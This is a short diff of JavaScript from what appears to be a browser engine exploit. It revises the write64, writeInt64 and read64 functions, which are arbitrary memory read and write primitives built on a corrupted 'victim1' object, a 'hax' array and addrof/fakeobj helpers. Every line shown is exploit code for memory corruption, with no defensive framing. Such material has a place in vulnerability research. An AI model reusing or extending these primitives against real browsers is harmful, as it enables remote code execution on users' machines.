@@ -614,18 +614,19 @@ fortunately fairly easy: execute the same get_by_val op twice, the second time w
 
         write64: function(where, what) {
             hax[1] = qwordAsFloat(where + 0x10);
-            victim1.prop = this.fakeobj(qwordAsFloat(what));
+            victim1.prop = qwordAsFloat(what);
         },
 	
 	writeInt64: function(where, what) {
             //set_victim_addr(where)
-            victim1.prop = this.fakeobj(floatAsQword(what.asDouble()));
+	    hax[1] = qwordAsFloat(where + 0x10);
+            victim1.prop = what.asDouble();
         },
 
 
         read64: function(where) {
             hax[1] = qwordAsFloat(where + 0x10);
-            var res = this.addrof(victim1.prop);
+            var res = floatAsQword(victim1.prop);
             //hax[1] = reset;
             //victim1.prop = shared_butterfly;
             return res;
